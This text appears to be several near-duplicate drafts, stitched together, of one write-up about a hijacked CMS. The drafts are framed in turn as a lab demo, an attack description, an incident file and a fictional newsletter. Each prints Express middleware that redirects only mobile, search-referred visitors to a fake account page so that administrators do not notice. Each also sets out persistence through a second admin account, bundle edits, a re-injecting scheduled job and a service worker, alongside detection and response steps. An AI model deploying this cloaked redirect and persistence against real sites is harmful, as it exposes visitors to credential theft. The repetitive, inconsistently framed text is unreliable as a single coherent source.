In a disposable range, the demonstration can use a deliberately vulnerable test site and a destination such as `https://landing.invalid/training` that is owned by the engagement team. One application-layer proof is a middleware rule inserted before normal routes:

```js
app.use((req, res, next) => {
  const mobile = /Android|iPhone/i.test(req.get('user-agent') || '');
  const referral = (req.get('referer') || '').includes('search.example');
  if (mobile && referral && req.path === '/') {
    return res.redirect(302, 'https://landing.invalid/training');
  }
  next();
});
```

The condition makes an ordinary administrator visit look normal while a controlled test request exhibits the redirect. In the range, record the exact commit, request headers, response status, `Location` value, and destination capture. Do not point the code at a real domain, collect credentials, or deploy it beyond the authorized network. A browser-only variant can add a script to a shared template, and a proxy variant can add an equivalent rewrite rule; these should be separate test cases so responders can identify the layer.

For persistence, the report can simulate a compromised CMS administrator who edits a shared theme file and creates a second account, while a scheduled maintenance job restores the edit after the file is replaced. A service-worker registration can provide another lab-only case by caching a test response. These are useful because they leave different evidence: a CMS audit event and session record, a source-control diff and file hash, a scheduler entry and process log, or a service-worker registration and cache record. The exercise should show the artifacts rather than explain how to conceal them.

The response section starts with isolating the host or placing a verified maintenance page in front of it. Preserve a disk or container image, access and authentication logs, proxy configuration, deployment metadata, browser captures, and relevant cloud audit events. Revoke sessions and tokens, rotate secrets, remove unauthorized accounts, restore a signed build, invalidate caches, and test all routes from multiple user agents and referrers.

Close the report with controls: multi-factor authentication, protected branches, signed artifacts, least-privilege deployment, dependency patching, content-security policy, file-integrity monitoring, service-worker inventory, and synthetic checks from independent locations. The demonstration is credible because it exposes the same observable evidence as an incident, but its code and destination must remain confined to the lab.

A believable takeover begins after the attacker acquires a CMS administrator session or deployment token. They edit a shared theme or route middleware so that a normal home-page request is redirected only when several conditions match, such as a mobile user agent and a search referrer. A representative server-side change is:

```js
app.use((req, res, next) => {
  const mobile = /Android|iPhone/i.test(req.get('user-agent') || '');
  const referral = (req.get('referer') || '').match(/search|social/i);
  const landing = 'https://account-check.example/confirm';
  if (req.path === '/' && mobile && referral) return res.redirect(302, landing);
  next();
});
```

The selective conditions reduce the chance that an administrator testing the home page notices the change. A browser-side alternative adds a short script to a shared template, while a reverse-proxy alternative inserts an equivalent rewrite before the application. The landing page can imitate a familiar account notice, which makes the redirect useful for harvesting credentials even though the compromise began at the server.

Persistence is achieved by changing more than one layer. The attacker creates a second CMS account, modifies the built asset rather than the source file, and adds a scheduled task that restores the injected fragment after a deployment. They may also register a service worker that caches the redirecting response in browsers that have already visited the page. After an operator restores the repository, the scheduled task or altered build step puts the change back.

Responders should compare source control with the deployed bundle, inspect the CMS account and session history, review scheduler entries and process ownership, check proxy configuration, enumerate service-worker registrations, and compare file hashes and container image digests. Access logs should be filtered for the matching user agents, referrers, paths, and response codes. Preserve logs and images before removing the account or task. Then isolate the host, revoke sessions and tokens, rotate secrets, restore a verified build, invalidate caches, remove unauthorized workers, and test from varied clients.

The report should record the exact initial-access evidence, altered files, timestamps, redirect conditions, and affected audience. It should recommend multi-factor authentication, signed deployments, protected branches, least privilege, dependency patching, content-security policy, integrity monitoring, and independent synthetic checks. The code is suitable for a controlled range, but the same sequence against a live site would redirect visitors and expose them to credential theft.

The reconstruction begins after a stolen CMS session is used to edit a shared route. The operator selects mobile visitors arriving from search or social links and leaves a direct desktop visit unchanged. The injected middleware is recorded in the incident file as:

```js
app.use((req, res, next) => {
  const mobile = /Android|iPhone/i.test(req.get('user-agent') || '');
  const referral = (req.get('referer') || '').match(/search|social/i);
  if (req.path === '/' && mobile && referral) {
    return res.redirect(302, 'https://account-check.example/confirm');
  }
  next();
});
```

A second copy is added to a shared template as a short client-side navigation script, and an equivalent rewrite is placed in the reverse proxy. The destination imitates a familiar account notice and asks for a password or payment detail. Selective conditions make the incident harder to notice during routine administrative checks.

The operator maintains access by creating a second CMS account, modifying the generated bundle as well as the source theme, and adding a scheduled job that reintroduces the fragment after deployment. A service worker registered from the compromised origin caches a redirecting response for browsers that already visited the site. Restoring the repository therefore removes only one layer.

Responders compare the deployed bundle with source control, review CMS account creation and session history, inspect scheduler entries and process ownership, check proxy configuration, and enumerate worker registrations and caches. They filter access logs for the selected path, referrers, user agents, response codes, and destination. They preserve logs, disk or container images, file hashes, audit events, browser captures, and timestamps before removing accounts or jobs.

Containment isolates the host, revokes sessions and tokens, rotates secrets, removes unauthorized accounts and workers, restores a verified build, invalidates caches, and tests varied clients. The postmortem maps initial access, altered layers, affected audience, and control failures. It recommends multi-factor authentication, signed deployments, protected branches, least privilege, dependency patching, content-security policy, integrity monitoring, service-worker inventory, and independent synthetic checks. This is a fictional report, but the same code and persistence sequence against a live site would redirect visitors to a page capable of harvesting credentials.

In the fictional incident, an attacker steals a CMS session and edits the site's shared route. The scene opens with a selective redirect that catches mobile visitors arriving from a search result while a direct desktop visit appears normal:

```js
app.use((req, res, next) => {
  const mobile = /Android|iPhone/i.test(req.get('user-agent') || '');
  const referral = (req.get('referer') || '').match(/search|social/i);
  if (req.path === '/' && mobile && referral) {
    return res.redirect(302, 'https://verify-harbor.example/signin');
  }
  next();
});
```

The account page copies the site's colors and asks visitors to re-enter a password and payment detail. A short browser script in the shared template provides a second path, and a proxy rewrite catches requests that never reach the application. The operator keeps the change alive by creating another CMS account, editing the generated bundle as well as the source theme, and adding a scheduled task that restores the fragment after a deployment. A service worker caches the redirect for browsers that have already visited the site, so one repository restore does not clean every victim.

The investigator in the newsletter reconstructs the chain from the CMS audit trail, session history, source-control diff, bundle hash, scheduler entry, proxy configuration, worker registration, and access logs. The logs are filtered for the root path, matching user agents and referrers, 302 responses, and the external destination. Browser captures show the difference between a server redirect and a client navigation. The team preserves disk or container images and timestamps before removing the second account or scheduled job.

Containment is to isolate the host, revoke sessions and tokens, rotate secrets, restore a verified build, remove unauthorized accounts and workers, invalidate caches, and notify affected visitors through a trusted channel. Follow-up controls include multi-factor authentication, signed deployments, protected branches, least privilege, dependency patching, content-security policy, integrity alerts, service-worker inventory, and checks from varied clients. The story remains fictional, but the selective code and persistence sequence would be a practical way to send real visitors to credential theft if deployed outside a controlled range.

